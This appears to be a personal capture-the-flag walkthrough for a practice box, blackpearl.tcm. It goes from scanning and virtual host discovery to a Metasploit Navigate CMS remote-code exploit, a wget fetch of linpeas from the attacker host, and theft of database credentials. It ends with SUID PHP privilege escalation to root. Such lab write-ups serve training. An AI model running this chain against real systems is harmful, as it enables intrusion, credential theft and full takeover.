$nmap -A -p- 192.168.86.199
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    | ssh-hostkey:
    |   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
    |   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
    |_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
    53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux) 
    | dns-nsid:
    |_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
    80/tcp open  http    nginx 1.14.2 ****
    |_http-title: Welcome to nginx!
    |_http-server-header: nginx/1.14.2
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

ffuf - No good

    http://<ip>
    + <body>
    + <!-- Webmaster: alek@blackpearl.tcm -->
    + <html>

gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --wildcard 2>/dev/null | grep "Status: 200"
/secret               (Status: 200) [Size: 209]
    DL file:
        OMG you got r00t !
        Just kidding... search somewhere else. Directory busting won't give anything.
        <This message is here so that you don't waste more time directory busting this particular website.>

hydra -hydra -l alek -P /usr/share/wordlists/rockyou.txt ssh://192.168.86.199 
    may need a customized list? "crunch"

dnsrecon -r 127.0.0.0/24 -n 192.168.86.199 -d extra (-d is domain && any domain is required) ** Virtual Host Routing**
        [*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
        [+] 	 PTR blackpearl.tcm 127.0.0.1
        [+] 1 Records Found
    + sudo vi /etc/hosts
        <ip>    blackpearl.tcm
        http://blackpearl.tcm
            Linux blackpearl 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 
        fuff once again:
            /nagivate - login.php ( Navigate CMS v2.8, © 2021)
                    **Always google new environment**
                https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/  
        msfconsole use use exploit/multi/http/navigate_cms_rce
                set domain - blackpearl.tcm : run
    + meterpreter > shell
        python -c 'import pty;pty.spawn("/bin/sh")'
            pwd: ~/blackpearl.tcm/navigate 
                ls -alth (gives us higher privs)
                    wget http://<ip>/linpeas.sh linpeas.sh
    +linpeas.sh:
        + /var/www/blackpearl.tcm/navigate/cfg/globals.php:define('PDO_PASSWORD', "H4x0r");
        + /var/www/blackpearl.tcm/navigate/cfg/globals.php:define('PDO_USERNAME', "alek");
        + mysql -u alek -p (pw H4x0r) :: Success
            show databases; show tables; use navigate
                select * from nv_users;
                    alek && PW: 26f1e0e7b718d27e0428e1b3b4b3f677
        ssh alek@<ip> -p H4x0r :: success
            find / -perm /6000 2</dev/nul (https://gtfobins.github.io/gtfobins/php/#suid)
                /php - GTFObins - click php -> SUID
                    /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);" ::  **Success**
                        # whoami
                          root
                            cd root/ && cat flag.txt ::
                                Good job on this one.
                                Finding the domain name may have been a little guessy,
                                but the goal of this box is mainly to teach about Virtual Host Routing which is used in a lot of CTF.

                    